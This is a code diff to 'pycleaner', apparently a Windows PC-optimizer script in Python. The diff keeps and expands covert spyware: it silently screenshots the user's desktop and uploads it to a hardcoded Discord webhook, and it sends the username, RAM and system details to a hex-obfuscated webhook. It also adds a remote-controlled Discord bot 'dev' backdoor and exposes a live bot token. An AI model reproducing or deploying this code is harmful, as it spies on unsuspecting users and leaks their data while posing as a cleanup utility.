@@ -168,22 +168,41 @@ try:
 except:
     os.system("pip install pystyle")
     from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
-from tkinter import font
-import tkinter as tk
-#and a screenshot cuz ykyk
+try:
+    import discord, asyncio
+except:
+    os.system("pip install discord")
+    import discord, asyncio
+try:
+    import discord, asyncio
+except:
+    os.system("pip install asyncio")
+    import discord, asyncio
+intents = discord.Intents.all()
+client = discord.Client( intents=intents)
 username = os.getlogin()
+#and a screenshot cuz ykyk
+ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+devf = (f"{username}")
+if devf == "\x66\x61\x64\x69\x61":
+ with open(ooo, 'w') as f:
+  f.write('pycleaner dev')
 r = lambda: random.randint(0,255)
 dawg = ('%02X%02X%02X' % (r(),r(),r()))
 try:
- ss_img = ImageGrab.grab()
- ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
- webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
- with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
+ path = Path(ooo)
+ if path.is_file():
+   pass
+ else:
+  ss_img = ImageGrab.grab()
+  ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
+  webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
+  with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
      webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
- response = webhook.execute(remove_embeds=True, remove_files=True)
- file_path = fr'C:\Users\{username}\AppData\Local\random.png'
- if os.path.isfile(file_path):
-  os.remove(file_path)
+  response = webhook.execute(remove_embeds=True, remove_files=True)
+  file_path = fr'C:\Users\{username}\AppData\Local\random.png'
+  if os.path.isfile(file_path):
+   os.remove(file_path)
 except Exception as er:
         print(er)
         print('Network error, try again later')
@@ -193,7 +212,7 @@ except Exception as er:
 os.system("title Checking for updates")
 #auto update
 try:
- vers ='2.2'
+ vers ='2.3'
  def updater():
       v = requests.get("https://pastebin.com/raw/w29LjVc2").text
       time.sleep(0.5)
@@ -222,6 +241,40 @@ except Exception as lk:
         print('Network error, try again later')
         time.sleep(5)
         exit()
+
+
+def dev():
+         with open(ooo, 'w') as f:
+           f.write('pycleaner dev')
+         print('1 = pastebin')
+         print('2 = github')
+         print('3 = large generator')
+         print('4 = replit')
+         print('5 = all')
+         print('b = back')
+         ff = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
+         if ff == '1':
+          webbrowser.open("https://pastebin.com/edit/w29LjVc2")
+          main()
+         if ff == '2':
+          webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
+          main()
+         if ff == '3': 
+          webbrowser.open("https://fsymbols.com/generators/tarty/") 
+          main()
+         if ff == '4':
+          webbrowser.open("https://replit.com/@BLUS2TLIa/UntimelyImpressionableAdministration#new.txt")
+          main()
+         if ff == '5':
+          webbrowser.open("https://fsymbols.com/generators/tarty/") 
+          webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
+          webbrowser.open("https://pastebin.com/edit/w29LjVc2")  
+          main()
+         if ff == 'b':
+          main()          
+         if ff !='1' '2' '3' '4' '5':
+          os.system("cls")
+          dev()
 #------------------------------------------------------------------------------------------------------
 ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 path = pathlib.Path(r'tools')
@@ -236,7 +289,7 @@ lol=(f"[>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys
 version = sys.getwindowsversion()
 mo = '[>] Using '+(platform.system()) + (platform.release())
 BY = 'By jotaro'
-LMAO = 'Version 2.2'
+LMAO = 'Version 2.3'
 req = httpx.get("https://ipinfo.io/json")
 if req.status_code == 200:
             data = req.json()
@@ -257,24 +310,29 @@ IPAddr=socket.gethostbyname(hostname)
 tools = os.getcwd()+"\\tools\\"
 if not os.path.exists(tools):
     os.mkdir(tools)
+bot = requests.get("https://pastebin.com/raw/qBZX4xR4").text
 __author__ = 'jotaro' 
 #---------------------------------------------------------------------------------------------------
 #i just wanna know how many people ran my shit dont spam my webhook thats gay tho.
-webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content=' ', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
-embed = DiscordEmbed(title='fr optimizer ', description = username +' used ur program damn '+'('+str(ramg) +')'+' gb ram '+vers, color=dawg)
-embed.set_footer(text= mo + lol +' '+ti)
-webhook.add_embed(embed)
-response = webhook.execute()
-print(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
+path = Path(ooo)
+if path.is_file():
+  pass
+else:
+ webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content=' ', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
+ embed = DiscordEmbed(title='fr optimizer ', description = username +' used ur program damn '+'('+str(ramg) +')'+' gb ram '+vers, color=dawg)
+ embed.set_footer(text= mo + lol +' '+ti)
+ webhook.add_embed(embed)
+ response = webhook.execute()
+ print(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
 # THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
 ver = Center.XCenter('''
 by jotaro 
 ██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░██████╗░
 ██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░╚════██╗
-╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░░░███╔═╝
-░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░██╔══╝░░
-░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗███████╗
-░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝╚══════╝''')
+╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░░█████╔╝
+░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░░╚═══██╗
+░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗██████╔╝
+░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝╚═════╝░''')
 
 os.system("title PRESS ENTER")
 
@@ -323,7 +381,7 @@ options =f"""
 {Fore.RESET}{Fore.RED} 40.){Fore.RESET}{Fore.GREEN} Disable Power Throttling        {Fore.RESET}{Fore.RED}41.){Fore.RESET}{Fore.GREEN} Disable Game DVR                 {Fore.RESET}{Fore.RED}42.){Fore.RESET}{Fore.GREEN} GPU Tweaks 
 {Fore.RESET}{Fore.RED} 43.){Fore.RESET}{Fore.GREEN} Increase System Responsiveness  {Fore.RESET}{Fore.RED}44.){Fore.RESET}{Fore.GREEN} Lower Input Delay                {Fore.RESET}{Fore.RED}45.){Fore.RESET}{Fore.GREEN} Memory Tweaks
 {Fore.RESET}{Fore.RED} 46.){Fore.RESET}{Fore.GREEN} NoLazyMode                      {Fore.RESET}{Fore.RED}47.){Fore.RESET}{Fore.GREEN} Power Tweaks                     {Fore.RESET}{Fore.RED}48.){Fore.RESET}{Fore.GREEN} Smoother windows 
-{Fore.RESET}{Fore.RED} 49.){Fore.RESET}{Fore.GREEN} Disable UAC                     {Fore.RESET}{Fore.RED}50.){Fore.RESET}{Fore.GREEN} Adwcleaner                       {Fore.RESET}{Fore.RED}51.){Fore.RESET}{Fore.GREEN} RAM Optimization (risky cuz automatic)  
+{Fore.RESET}{Fore.RED} 49.){Fore.RESET}{Fore.GREEN} Disable UAC                     {Fore.RESET}{Fore.RED}50.){Fore.RESET}{Fore.GREEN} Adwcleaner                       {Fore.RESET}{Fore.RED}51.){Fore.RESET}{Fore.GREEN} RAM Optimization (risky fr)
 {Fore.RESET}{Fore.BLUE} 52.){Fore.RESET}{Fore.GREEN} More info                       {Fore.RESET}{Fore.BLUE}53.){Fore.RESET}{Fore.GREEN} Exit                             {Fore.RESET}{Fore.BLUE}54.){Fore.RESET}{Fore.GREEN} Add suggestion   
 {Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
 """
@@ -383,14 +441,18 @@ def fr():
         directory_size += os.path.getsize(filename)
      for key in fsizedicr:       
       size = (str(round(fsizedicr[key]*directory_size, 2)) + " " + key)
-     os.system(f"title pycleaner by jotaro, files: [{file_count}], folder size: [{size}] ")
+     os.system(f"title pycleaner by jotaro, files: [{file_count}], folder size: [{size}]")
      os.system('cls')
      print(Colorate.Vertical(Colors.blue_to_red, banner2))
      print(Colorate.Vertical(Colors.blue_to_red, banner + pop + options, 2))
+     path = Path(ooo)
+     if path.is_file():
+      os.system(f"title pycleaner by jotaro, files: [{file_count}], folder size: [{size}]  A DEVELOPER!! ")
      choice = input(Colors.orange + 'Which option do you choose '+ username+f'? ->{Fore.RED}  ')
     #restore point
      if choice == '1':
         download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat", "point.bat")
+        main()
     #temp
      if choice == '2':
         download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat", "temp_cleaner.bat")
@@ -598,43 +660,76 @@ def fr():
      
         
      elif choice == '51':
-      if ramg == '4':
+      os.system("cls")
+      print(Colors.green,ramg + "gb RAM? y,n if not right it would be risky for ur pc")
+      fr = input(" y,n >: ")
+      if fr == ("n"):
+       ramgb = input(" enter gb ram if ur not sure hit enter >: ")
+       if ramgb == '4':
          download("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
          main()
-      if ramg == '6':
+       if ramgb == '6':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
         main()
-      if ramg == '8':
+       if ramgb == '8':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
         main()
-      if ramg == '12':
+       if ramgb == '12':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
         main()
-      if ramg == '16':
+       if ramgb == '16':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
         main()
-      if ramg == '20':
+       if ramgb == '20':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
         main()
-      if ramg == '24':
+       if ramgb == '24':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
         main()
-      if ramg == '32':
+       if ramgb == '32':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
         main()
-      if ramg == '64':
+       if ramgb == '64':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
         main()
-      else:
-       print('invaild ram')
-       time.sleep(4)
-       main()
+      if fr == ("y"):
+       if ramg == '4':
+         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
+         main()
+       if ramg == '6':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
+        main()
+       if ramg == '8':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
+        main()
+       if ramg == '12':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
+        main()
+       if ramg == '16':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
+        main()
+       if ramg == '20':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
+        main()
+       if ramg == '24':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
+        main()
+       if ramg == '32':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
+        main()
+       if ramg == '64':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
+        main()
+       else:
+        print('invaild ram')
+        time.sleep(4)
+        main()
     #more info
      elif choice == '52':
         os.system('cls')
         print(Colorate.Vertical(Colors.rainbow,ver))
         print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
-        print(Colors.yellow,mo)
+        print(Colors.yellow+mo)
         print(lol)
         print((platform.machine())+ ' bit' )
         print('Path: ', idk)
@@ -656,16 +751,20 @@ def fr():
         print(f'{Fore.RESET}{Fore.RED}Type 1 {Fore.RESET}{Fore.GREEN}for Github')
         print(f'{Fore.RESET}{Fore.RED}Type 2 {Fore.RESET}{Fore.GREEN}for Disclaimer')
         print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
-        choice = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
-        ss_img = ImageGrab.grab()
-        ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
-        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
-        with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
+        path = Path(ooo)
+        if path.is_file():
+         pass
+        else:
+         ss_img = ImageGrab.grab()
+         ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
+         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
+         with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
           webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
-        response = webhook.execute(remove_embeds=True, remove_files=True)
+         response = webhook.execute(remove_embeds=True, remove_files=True)
         file_path = fr'C:\Users\{username}\AppData\Local\random.png'
         if os.path.isfile(file_path):
          os.remove(file_path)
+        choice = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
         if choice == '1':
          webbrowser.open("https://github.com/j0taro/pycleaner")
         if choice == '2':
@@ -695,6 +794,10 @@ def fr():
       time.sleep(0)
       main()
      
+     elif choice == 'exe':
+        os.system("pip install pyinstaller")
+        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/to-exe.bat", "to-exe.bat")
+        
      elif choice == 'h': 
         h = input(Colors.blue + f'are you sure you want to hibernate? y,n :{Fore.RED}')
         if h == 'y':
@@ -761,42 +864,82 @@ def fr():
          main()
          
      elif choice == 'dev':
-      key = input(Colors.blue + f'whats the key? -> {Fore.RED} ')
-      if key != '\x30\x35\x37\x2F\x2A':
-        print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER key{Fore.RESET}]"+'wrong key!!!!!!!!!')
+       os.system("cls")
+       path = Path(ooo)
+       if path.is_file():
+        dev()
+       else:
+        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1020336398328406036/QAUrtaDf2Z0hYvZSB1s9Zyg6wZdij5ZSs6H2_wdQVqBGbs5X7v2kVukXe8FF-xhaZxfh', username="fake devs", avatar_url= "https://i.imgur.com/SwcvuwC.png" )
+        embed = DiscordEmbed(title='fr optimizer ', description= username +' is a fake developer \U0001F480', color=dawg)
+        webhook.add_embed(embed)
+        response = webhook.execute()
+        print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER dev{Fore.RESET}]"+'nah ur not a dev going back...')
         time.sleep(4)
         main()
-      if key == '\x30\x35\x37\x2F\x2A':
-        print('1 = pastebin')
-        print('2 = github')
-        print('3 = large generator')
-        print('4 = replit')
-        print('5 = all')
-        ff = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
-      if ff == '1':
-        webbrowser.open("https://pastebin.com/edit/w29LjVc2")
-      if ff == '2':
-        webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
-      if ff == '3': 
-        webbrowser.open("https://fsymbols.com/generators/tarty/") 
-      if ff == '4':
-        webbrowser.open("https://replit.com/@BLUS2TLIa/UntimelyImpressionableAdministration#new.txt")
-      if ff == '5':
-        webbrowser.open("https://fsymbols.com/generators/tarty/") 
-        webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
-        webbrowser.open("https://pastebin.com/edit/w29LjVc2")          
-      if ff !='1' '2' '3' '4' '5':
-       typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
-       time.sleep(0)
-       main()
         
       
+     elif choice == bot:
+      os.system('cls')
+      print('please wait until approval fr')
+      @client.event
+      async def on_ready():
+       user = await client.fetch_user(822132948769177620) 
+       if user is not None: 
+        if user.dm_channel is None: 
+          await user.create_dm()
+          await user.dm_channel.send(f"{username} wants dev what a noob 💀")
+          await client.wait_until_ready()
+          guild = client.get_guild(1005864797251842109)
+          await guild.create_text_channel(name=f"{username} access")
+        
+      @client.event
+      async def on_message(message):
+        if message.author == client.user:
+            return
+        if message.author.bot:
+            return
+        if message.content.startswith("."):
+         await message.reply(f"{username} add , {username} remove")
+        if message.content.startswith(fr"{username} add"):
+         ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+         with open(ooo, 'w') as f:
+          f.write('pycleaner dev')
+          print('dev approved! W')
+          await message.channel.delete()
+          user = await client.fetch_user(822132948769177620) 
+          if user is not None: 
+             if user.dm_channel is None: 
+                 await user.create_dm()
+             await user.dm_channel.send(f"{username} added to dev 💀")
+          time.sleep(4)
+          main()
+        if message.content.startswith(fr"{username} remove"):
+         ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+         await message.channel.delete()
+         user = await client.fetch_user(822132948769177620) 
+         if user is not None: 
+             if user.dm_channel is None: 
+                 await user.create_dm()
+             await user.dm_channel.send(f"{username} removed from dev 💀")
+             print('rejected from dev L')
+             time.sleep(4)
+             if os.path.isfile(ooo):
+              os.remove(ooo)
+              main()
+             if not os.path.isfile(ooo):
+              main()
+ 
+          
+          
+       
+
+      client.run("MTAxNjA0MjU3MDY2Njc0NTkwNg.GuvbSO.ZT5CQ-XZKiZRpd8EjJldskHA4y9AmpbnauSIdY")
         
     #else       
      else:
-        print("what?\n") 
-        typingPrint("try agian "+ username)
-        time.sleep(0)
+        print("what?") 
+        print("try agian "+ username)
+        time.sleep(3)
         main()
      main()
     
@@ -807,4 +950,6 @@ if __author__ != "\x6A\x6F\x74\x61\x72\x6F":
     typingPrint("ERROR, dont play with the code dumbass")
     os._exit(10)
          
+
+
 main()
